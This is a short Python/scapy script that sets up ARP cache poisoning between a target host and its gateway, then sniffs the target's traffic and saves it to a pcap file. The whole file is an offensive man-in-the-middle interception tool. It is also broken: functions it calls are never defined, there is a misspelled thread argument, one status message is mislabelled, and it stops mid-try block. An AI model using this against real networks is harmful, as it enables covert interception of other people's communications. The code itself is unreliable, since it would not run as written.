#!/usr/bin/python env
#coding: utf-8

from scapy.all import *
import os
import sys
import threading
import signal

interface = "eth0"
target_ip = "192.168.0.73"
gateway_ip = "192.168.0.1"
packet_count = 1000

conf.iface = interface
conf.verb = 0

print("[*] Setting up %s" % interface)

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print("[!!!] Failed to get gateway MAC.Exiting")
else:
    print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))


target_mac = get_mac(target_ip)


if target_mac is None:
    print("[!!!] Failed to get target MAC.Exiting")
else:
    print("[*] Gateway %s is at %s" % (target_ip, target_mac))


poison_thread = threading.Thread(targer= poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)
    bfp_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count, filter=bfp_filter, iface=interface)
    wrpcap('arpper.pcap', packets)